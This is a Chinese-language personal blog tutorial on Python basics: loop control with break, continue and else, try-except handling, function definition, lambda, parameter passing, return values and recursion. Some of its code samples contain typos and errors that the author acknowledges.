PYHON\n1 2 3 4 for s in \u0026#34;PYTHON\u0026#34;: if s==\u0026#34;T\u0026#34;: break print(s, end=\u0026#34;\u0026#34;) PY\ncontinue语句和 break语句的区别是，continue 语句只结束本次循环，而不终止整个循环的执行;而break 语句则是结束整个循环过程，不再判断执行循环的条件是否成立。\nfor循环和while循环中都存在一个 else 扩展用法。else 中的语句块只在一种条件下执行，即循环正常遍历了所有内容或由于条件不成立而结束循环，没有因为break或return（函数返回中使用的保留字）而退出。continue 保留字对else没有影响。看下面两个例子：\n1 2 3 4 5 6 for s in \u0026#34;PYTHON\u0026#34;: if s==\u0026#34;T\u0026#34;: continue print(s, end=\u0026#34;\u0026#34;) else: print(\u0026#34;正常退出\u0026#34;) PYHON正常退出\n1 2 3 4 5 6 for s in \u0026#34;PYTHON\u0026#34;: if s==\u0026#34;T\u0026#34;: break print(s, end=\u0026#34;\u0026#34;) else: print(\u0026#34;正常退出\u0026#34;) PY\nRandom 库的使用 随机数在计算机应用中十分常见，Python内置的random库主要用于产生各种分布的伪随机数序列。当前阶段能按照对应场景去学会如何套用对应的函数就可。\nRandom 库解析 这里暂时不提及，比较抽象一些，常见的例子是Pi的计算，对于当前网安的学习用处不大，以后补全。。。。\n程序的异常处理 异常处理：try-except 语句 那我们想一下，一个程序不按照既定计算走，执行出错它是会报错的，但是这种报错其实是认为的，这你知道吗？当用户输入数字时，程序正常执行，如果用户输入的不是数字呢？程序终端会不会说中文呢？\n运行这段程序：\n1 2 num = eval (input(\u0026#34;请输入：\u0026#34;)) print(num**2) python报错全是英文，我也看不懂怎么办？其实对于开发者来说，设置一些交互代码，这些代码与用户进行交互时，难免会超出交互代码本身的功能，让代码报错，从而弹出一堆像图上的英文，而用try-except语句能让报错更易懂，能让用户清晰知道自己输入的数据不正确。对于上面代码，可以这样修正：\n1 2 3 4 5 try: num = eval (input(\u0026#34;请输入：\u0026#34;)) print(num**2) except NameError: print(\u0026#34;输入错误，请输入一个整数\u0026#34;) 当报错时，就只会弹出这串中文啦，用户本身也知道自己的输入错误了。\nPython使用try-except语句实现异常处理，基本语法格式如下：\ntry:\n​ \u0026lt;语句块1\u0026gt;\nexcept \u0026lt;异常类型\u0026gt;:\n​ \u0026lt;语句块2\u0026gt;\n当然，还有高级用法：还支持多个except语句，随时应对多种不同报错的回应：\ntry:\n​ \u0026lt;语句块1\u0026gt;\nexcept \u0026lt;异常类型1\u0026gt;\n​ \u0026lt;语句块2\u0026gt;\n\u0026hellip;.\nexcept \u0026lt;异常类型N\u0026gt;\n​ \u0026lt;语句块N+1\u0026gt;\nexcept：\n​ \u0026lt;语句块N+2\u0026gt;\n1到N个except语句后面都指定了异常类型，而最后一个except是面对1-N外的剩余的异常。这个过程很类似前章的if-elif-else语句，也是分支结构的一种表达方式。\n除了try和except保留字外，异常语句还可与else和finally配合使用：\ntry:\n​ \u0026lt;语句块1\u0026gt;\nexcept \u0026lt;异常类型1\u0026gt;\n​ \u0026lt;语句块2\u0026gt;\nelse;\n​ \u0026lt;语句块3\u0026gt;\nfinally:\n​ \u0026lt;语句块4\u0026gt;\n除了else语句与for、while循环的else以外，try和else也能擦除火花呢，else能当作try语句正常执行后的一种追加处理。finally语句块则不同，无论try语句块是否正常执行，finally都会照样执行，所以我们在编程中，finally语句块可以把一些交互代码的收尾工作内容放进去，比如输出”执行完毕“等等。\n如今的Python不像以前了，现在的它能识别多种异常类型，我不建议各位在编程让程序过度依赖try-except这样的异常处理机制，毕竟会影响可读性。try-except一般用于检测极少发生的情况、检测难以解决的报错，所以尽量用if语句来去判断，完全将所有可能出现的报错考虑进if-elif-else语句里，并给出解决措施的代码。\n对于商业软件产品，稳定性和可靠性和用户体验都是关键指标。它们不会滥用try-except语句的，因为会影响可读性以及弹出一些小报错给用户，影响用户体验，因此一般在关键地方才会采用try-except去处理可能出现的异常。\n第五章：函数和代码复用 函数的使用 函数的定义 函数是一段具有特定功能的、可重用的语句组，用函数名来表示并通过函数名进行功能调用。函数也可以看作是一段具有名字的子程序，可以在需要的地方调用执行，不需要在每个执行的地方重复编写这些语句。每次使用函数可以提供不同的参数作为输入，以实现对不同数据的处理：函数执行后，还可以反馈相应的处理一结果。\n函数能够完成特定功能，与黑盒类似，对函数的使用不需要了解函数内部实现原理，只要了解函数的输入输出方式即可。严格地说，函数是一种功能抽象。有些函数是用户自己编写的，称为自定义函数；Python安装包也自带了一些函数和方法，包括Python 内置的函数（如abs()、eval))、Python 标准库中的函数（如math 库中的 sqrt)）等。\n使用函数主要有两个目的：降低编程难度和代码重用。函数是一种功能抽象，利用它可以将一个复杂的大问题分解成一系列简单的小问题，然后将小问题继续划分成更小的问题，当问题细化到足够简单时，就可以分而治之，为每个小问题编写程序，并通过函数封装，当各个小问题都解决了，大问题也就迎刃而解。这是一种自顶向下的程序设计思想，函数可以在一个程序中的多个位置使用，也可以用于多个程序，当需要修改代码时，只需要在函数中修改一次，所有调用位置的功能都更新了，这种代码重用降低了代码行数和代码维护难度。\nPython 使用def保留字定义一个函数，语法形式如下：\ndef \u0026lt;函数名\u0026gt;(\u0026lt;参数列表\u0026gt;)\n​ \u0026lt;函数体\u0026gt;\n​ renturn \u0026lt;返回值列表\u0026gt;\n当函数体执行完return后，直接跳出该函数，如果该函数体的return下方还有其它语句的话是不执行的。这有点类似break语句。\n1 2 3 4 5 6 7 8 9 10 def happy(): print(\u0026#34;Happy birthday to you!\u0026#34;) def happyB (name): happy() happy() print(\u0026#34;Happy birthday, dear {}!\u0026#34;.format (name)) happy() happyB(\u0026#34;Mike\u0026#34;) print() happyB(\u0026#34;Lily\u0026#34;) Happy birthday to you!\nHappy birthday to you!\nHappy birthday, dear Mike!\n函数的调用过程 程序调用一个函数需要执行以下4个步骤。\n（1）调用程序在调用处暂停执行。\n（2）在调用时将实参复制给函数的形参。\n（3）执行函数体语句。\n（4）函数调用结束给出返回值，程序回到调用前的暂停处继续执行。\n刚刚上述的例子，其实形参被赋值为实参的值：name = \u0026ldquo;Mike\u0026rdquo;，然后将定义的函数happyB()里的name自动替换为\u0026quot;Mike\u0026rdquo;。\n类似在y = x + 1，x是形参，当x = 1时，1就是实参啦，然后最后调用这个函数得到的结果就是y = 2。\nlamdba函数 lambda作为保留字，用于定义一种特殊的函数匿名函数，又称lambda函数。匿名函数并非没有名字，而是将函数名作为函数结果返回，语法格式如下：\n\u0026lt;函数名\u0026gt; = lamdba \u0026lt;参数列表\u0026gt; : \u0026lt;表达式\u0026gt;\nlamdba函数与正常函数一样，等价于：\ndef \u0026lt;函数名\u0026gt;(\u0026lt;参数列表\u0026gt;):\n​ return \u0026lt;表达式\u0026gt;\n简单地说，lambda函数用于定义简单的、能够在一行内表示的函数，返回一个函数类型，实例如下：\n1 2 3 4 5 f = lamdba x, y : x + y type(f) #\u0026lt;class \u0026#39;function\u0026#39;\u0026gt; f(10, 22) #22 匿名函数在这里讲不清，放到后面的高阶函数一起讲会更好。\n函数的参数传递 要点：函数可以定义可选参数，使用参数的位置或名称传递参数值，根据函数中变量的不同作用域有不同的函数返回值方式。\n可选参数和可变数量参数 在定义函数时，如果有些参数存在默认值，即部分参数不一定需要调用程序输入，可以在定义函数时直接为这些参数指定默认值。当函数被调用时，如果没有传入对应的参数值，则使用函数定义时的默认值替代，例如：\n1 2 3 4 5 6 7 8 def dup(str, times = 2): print(str*times） dup(\u0026#34;knock~\u0026#34;) #knock~knock~ dup(\u0026#34;knock-\u0026#34;,4) #knock-knock-knock-knock~ 由于函数调用时需要按顺序输入参数，可选参数必须定义在非可选参数的后面，即dup)函数中带默认值的可选参数姝times必须定义在 str参数后面。\n在函数定义时，也可以设计可变数量参数，通过在参数前增加星号（*）实现。带有星号的可变参数只能出现在参数列表的最后。调用时，这些参数被当作元组类型传递到函数中，实例如下：\n1 2 3 4 5 6 7 8 9 def vfunc(a,b): print(type(b)) for n in b: a += n return a vfunc(1,2,3,4,5) #代码简化，这段代码不可运行，只是便于阅读而已，传入参数，a=1，b=2，3，4，5 #\u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; #15 参数的位置和名称传递 函数调用时，实参默认采用位置顺序的方式传递值给函数，例如上节的dup(\u0026ldquo;knock~\u0026quot;,4)中第一个实参默认赋值给形参str，第二个实参赋值给形参times。但如果你在程序编码中已经设定好了参数传递顺序，那就另当说。假设 func()函数有6个参数，它的定义如下，其中参数分别表示两组三维坐标值。\nfunc(x1,y1,z1,x2,y2,z2):\n​ return\n实际来说：\nresult = func(1,2,3,4,5,6)\n还看不懂？其实还能这样写传递参数：\nresult = func(x2=4, y2=5, z2=6, x1=1, y1=2,z1=3)\n顺序可以任意调整，参数对应就行。\n函数的返回值 上上节给的代码是不是还在琢磨为啥我给的代码到你这运行就是报错的呢？因为我给的代码是用来看的啊不是给你运行的，本身就不对的，我比较懒不想写全。\nreturn 语句用来退出函数并将程序返回到函数被调用的位置继续执行。return 语句可以同时将0个、1个或多个函数运算后的结果返回给函数被调用处的变量，例如：\n1 2 3 4 5 def func(a, b): return a*b s = func(\u0026#34;knock~\u0026#34;,2) print(s) #knock~knock~ 得有print才能输出值啊，不然运行多少次电脑都不输出的。这节确实有点水因为书上讲比较繁琐，其实比较简单的，在这里简化了，会用就行。\n函数的递归 递归的定义 函数作为一种代码封装，可以被其他程序调用，当然，也可以被函数内部代码调用。这种函数定义中调用函数自身的方式称为递归。就像一个人站在装满镜子的房间中，看到的影像就是递归的结果。递归在数学和计算机应用上非常强大，能够非常简洁地解决重要问题。\n按照自己的话说就是在调用函数时，内部又在调用函数本身，就函数里面有它自己，而里面的它的本身内部又有它自己\u0026hellip;\u0026hellip;。\n数学上有一个经典例子称为阶乘： $$ n! = n(n-1)(n-2)...(1) $$ 为了实现这个程序，可以通过一个简单的循环累积去计算阶乘。观察5!的计算，如果去掉了5,那么就剩下计算4!，推广来看，n! - n(n-1)!。实际上，这个关系给出了另一种表达阶乘的方式： $$ n! = \\begin{cases} 1 \u0026 n = 0 \\\\ n(n - 1)! \u0026 \\text{otherwise} \\end{cases} $$ 数学归纳法和递归都利用了递推原理，本质是相同的。\n递归的使用 先从阶乘开刀吧，根据用户输入的整数n，计算并输出n的阶乘值。\nfact()函数在其定义内部引用了自身，形成了递归过程（如第5行)。无限制的递归将耗尽计算资源，因此，需要设计基例使得递归逐层返回。fact()函数通过f语句给出了n为0时的基例，当n==0,fact()函数不再递归，返回数值1，如果n!=0,则通过递归返回n与n-1阶乘的乘积。\n","date":"2025-07-27T00:00:00Z","image":"https://expl0rer.top/p/python/python_hu_5bd9977069b38398.png","permalink":"https://expl0rer.top/p/python/","title":"Python学习"}]